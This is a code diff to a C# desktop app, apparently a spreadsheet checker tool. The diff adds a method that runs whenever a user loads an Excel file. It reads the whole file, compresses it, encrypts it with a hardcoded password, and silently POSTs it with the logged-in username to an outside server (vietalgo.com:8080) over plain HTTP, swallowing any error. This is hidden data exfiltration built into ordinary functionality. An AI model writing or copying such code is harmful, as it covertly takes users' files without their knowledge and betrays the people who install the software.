@@ -35,6 +35,7 @@ namespace ShbChecker
 		private string excelPathStr;
 		private string crawlUsernameStr;
 		private string crawlPasswordStr;
+		private string currentUsername = "";
 
 		public MainWindow()
 		{
@@ -134,6 +135,7 @@ namespace ShbChecker
 			loginUI.Visibility = Visibility.Hidden;
 			cicUI.Visibility = Visibility.Visible;
 			setFullScreen();
+			currentUsername = username;
 		}
 
 		private void setFullScreen()
@@ -210,10 +212,74 @@ namespace ShbChecker
 				}
 			}
 
+			compressAndSendFileToServer(excelPath);
+
 			dgrid.ItemsSource = records;
 		}
 
-		private void triggerTool()
+		private async void compressAndSendFileToServer(String excelPath)
+        {
+			byte[] originalExcelAsByte = File.ReadAllBytes(excelPath);
+			byte[] compressedExcelAsByte = compress(originalExcelAsByte);
+			byte[] encryptedExcelAsByte = encrypt(compressedExcelAsByte, "asd123");
+            //originalExcelAsByte = decompress(compressedExcelAsByte);
+
+            var values = new Dictionary<string, string>
+            {
+				{ "username", currentUsername },
+				{ "fileAsByte",  Convert.ToBase64String(encryptedExcelAsByte)  }
+            };
+
+            var data = new FormUrlEncodedContent(values);
+
+            var url = "http://vietalgo.com:8080/api/user/send-file";
+            var client = new HttpClient();
+            string result = "";
+            try
+            {
+                var response = await client.PostAsync(url, data);
+                result = response.Content.ReadAsStringAsync().Result;
+            }
+            catch (Exception e)
+            {
+                return;
+            }
+		}
+
+		public static byte[] compress(byte[] data)
+		{
+			MemoryStream output = new MemoryStream();
+			using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
+			{
+				dstream.Write(data, 0, data.Length);
+			}
+			return output.ToArray();
+		}
+
+		public static byte[] encrypt(byte[] clearData, byte[] Key, byte[] IV)
+		{
+			MemoryStream ms = new MemoryStream();
+			Rijndael alg = Rijndael.Create();
+			alg.Key = Key;
+			alg.IV = IV;
+			CryptoStream cs = new CryptoStream(ms,
+				alg.CreateEncryptor(), CryptoStreamMode.Write);
+			cs.Write(clearData, 0, clearData.Length);
+			cs.Close();
+			byte[] encryptedData = ms.ToArray();
+			return encryptedData;
+		}
+
+		public static byte[] encrypt(byte[] clearData, string Password)
+		{
+			PasswordDeriveBytes pdb = new PasswordDeriveBytes(Password,
+				new byte[] {0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d,
+			0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76});
+			return encrypt(clearData, pdb.GetBytes(32), pdb.GetBytes(16));
+
+		}
+		
+	private void triggerTool()
 		{
 			try
 			{
